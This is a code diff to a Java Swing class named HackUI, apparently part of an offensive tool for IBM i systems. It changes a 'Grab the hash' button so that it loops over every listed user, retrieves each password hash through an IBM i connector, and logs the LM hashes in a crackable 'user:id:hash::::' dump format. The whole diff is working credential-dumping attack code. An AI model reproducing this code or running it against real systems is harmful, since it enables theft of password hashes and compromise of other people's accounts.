@@ -1013,7 +1013,7 @@ public class HackUI extends javax.swing.JFrame {
         GrabHashButton.setText("Grab the hash");
         GrabHashButton.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
-                GrabHashButtonActionPerformed(evt);
+                GrabAllHashesButtonActionPerformed(evt);
             }
         });
 
@@ -1570,6 +1570,26 @@ public class HackUI extends javax.swing.JFrame {
             }
         }
     }//GEN-LAST:event_escalatePrivilegesButtonActionPerformed
+
+    private void GrabAllHashesButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_GrabHashButtonActionPerformed
+        for (int i = 0; i < privilegeEscalatorUserList.getModel().getSize(); i++) {
+            try {
+                String userName = String.valueOf(privilegeEscalatorUserList.getModel().getElementAt(i));
+                userNameHashLabel.setText(userName);
+                String hashString = testSystem.getEncryptedPassword(userName, IBMiConnector.PASSWORD_HASH_ALLDATA);
+                if (hashString == null) {
+                    Logger.getLogger(HackUI.class.getName()).log(Level.SEVERE, "Could not retrieve hashes. Insufficient privileges?");
+                    return;
+                }
+                Logger.getLogger(HackUI.class.getName()).log(Level.SEVERE, userName + ":" + String.valueOf(i) + ":" +
+                        testSystem.getEncryptedPasswordFromHashString(hashString, IBMiConnector.PASSWORD_HASH_LMHASH) +
+                        "::::"
+                );
+            } catch (Exception ex) {
+                Logger.getLogger(HackUI.class.getName()).log(Level.SEVERE, null, ex);
+            }
+        }
+    }
 
     private void GrabHashButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_GrabHashButtonActionPerformed
         if (!privilegeEscalatorUserList.isSelectionEmpty()){
